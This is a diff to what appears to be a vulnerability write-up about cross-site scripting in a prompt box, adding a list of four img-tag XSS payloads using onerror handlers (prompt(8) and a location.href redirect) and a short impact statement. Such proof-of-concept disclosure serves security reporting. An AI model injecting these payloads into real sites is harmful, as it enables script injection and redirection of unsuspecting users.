@@ -17,3 +17,16 @@ Redirection to  different site
        
 4) you can put xss payload in the prompt box(some certain payload work not all of them 
     like prompt() , print()
+    
+## Payloads Used 
+1) <img/src/onerror=prompt(8)> 
+
+2)<img src/onerror=prompt(8)>
+
+3)<img src =q onerror=prompt(8)> 
+
+4)<img src=q onerror=location.href = "https://www.example.com";>
+
+# Impact 
+
+Attacker can use this vulnerability to redirect it to desired page itself.  
